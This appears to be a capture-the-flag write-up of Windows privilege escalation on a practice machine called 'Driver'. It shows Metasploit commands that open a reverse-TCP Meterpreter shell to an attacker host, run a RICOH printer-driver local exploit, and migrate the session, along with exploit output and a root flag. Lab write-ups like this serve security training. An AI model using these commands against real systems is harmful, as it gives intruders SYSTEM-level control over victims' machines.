# Driver — Privilege Escalation

**Target IP:** 10.129.95.238 | **Initial User:** `tony` | **Final:** ✅ SYSTEM
**Updated:** 2026-03-24

---

## Enumeration Findings

### PowerShell History (PSReadline)
```powershell
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

**Key signal:** RICOH printer driver management in command history → driver privesc potential.

### Print Spooler
```powershell
Status Name    DisplayName
------ ----    -----------
Running spooler Print Spooler
```

- Spooler running ✅
- User can add printers ✅
- Driver directory: Full access detected

---

## Primary Vector: RICOH Driver Privilege Escalation

| Property | Value |
|----------|-------|
| **Module** | `exploit/windows/local/ricoh_driver_privesc` |
| **Type** | Local privilege escalation |
| **Vulnerable Component** | RICOH PCL6 Universal Driver |
| **Target** | SYSTEM |

### Execution

**1. Establish Meterpreter**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.X
set LPORT 4444
run
```

**2. Run Exploit (background session first)**
```bash
background
use exploit/windows/local/ricoh_driver_privesc
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.X
set LPORT 1337
run
```

### Critical: Session Migration

**Problem:** Meterpreter landed in **Session 0** (non-interactive services session):
```
2332 3444 shell.exe x64 0 DRIVER\tony  ← Session 0 (ISOLATED)
748  660  explorer.exe x64 1 DRIVER\tony ← Session 1 (INTERACTIVE)
```

**Solution:** Migrate to interactive session:
```bash
migrate 748              # explorer.exe PID
# or
execute -f notepad.exe -H -c -i
migrate <notepad_pid>
```

**Why required:**
- Session 0 = non-interactive isolated services context
- Session 1+ = user desktop with interactive logon token
- Local exploits require interactive session for proper token handling

### Architecture

**Initial error:** `payload should use same architecture as target driver`

**Fix:** Use x64 payload — RICOH driver on this system is 64-bit.

### Exploit Output

```
[*] Started reverse TCP handler on 10.10.14.X:1337
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Exploiting...
[*] Meterpreter session 2 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Root Access ✅

```powershell
C:\Users\Administrator\Desktop> type root.txt
e7d73146dad66f3cce306fcf216987aa
```

| Field | Value |
|-------|-------|
| **Final User** | `NT AUTHORITY\SYSTEM` |
| **Root Flag** | `e7d73146dad66f3cce306fcf216987aa` |
| **Flag Location** | `C:\Users\Administrator\Desktop\root.txt` |

---

## Alternative: PrintNightmare (CVE-2021-34527)

- Spooler running ✅ | User can add printers ✅ | Windows 10 / Server 2019 ✅
- Box name "DRIVER" hints at print theme

**Not pursued** — RICOH was more reliable given the specific driver present.

---

## Lessons Learned

```
✅ PSReadline history (ConsoleHost_history.txt) = user activity goldmine
   → Found RICOH driver clue → privesc vector

✅ Session interactivity discipline matters
   → Session 0 (non-interactive) cannot run local exploits
   → Always migrate to Session 1+ (explorer.exe/notepad.exe/cmd.exe)

✅ Architecture matching is critical
   → x64 payload worked; x86 gave "architecture mismatch"

✅ Kernel-mode driver exploits = powerful privesc
   → RICOH driver runs at SYSTEM → single exploit = full escalation

✅ Box naming hints at theme
   → "DRIVER" → print drivers → RICOH/PrintNightmare vectors
```
